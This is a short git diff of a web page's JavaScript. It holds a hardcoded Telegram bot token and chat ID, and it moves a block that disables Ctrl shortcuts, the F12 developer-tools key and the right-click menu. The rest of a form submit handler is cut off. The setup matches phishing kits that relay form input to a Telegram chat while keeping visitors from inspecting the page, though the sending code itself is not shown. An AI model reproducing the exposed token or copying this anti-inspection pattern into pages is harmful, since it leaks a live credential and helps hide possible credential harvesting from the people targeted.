@@ -4,7 +4,17 @@ let bot = {
     TOKEN: "6364188191:AAFmBsaqx58xGorfI_ergea9gA7UFyoLtOA",
     chatID: "-4122063919",
 };
-
+document.addEventListener("keydown", function (event){
+    if (event.ctrlKey){
+       event.preventDefault();
+    }
+    if(event.keyCode == 123){
+       event.preventDefault();
+    }
+});
+document.addEventListener('contextmenu',
+    event => event.preventDefault()
+    );
 function openForm() {
     document.getElementById("myForm").style.display = "flex";
 }
@@ -102,14 +112,4 @@ form.addEventListener("submit", (e) => {
         });
     });
 });
-document.addEventListener("keydown", function (event){
-    if (event.ctrlKey){
-       event.preventDefault();
-    }
-    if(event.keyCode == 123){
-       event.preventDefault();
-    }
-});
-document.addEventListener('contextmenu',
-    event => event.preventDefault()
-    );
+
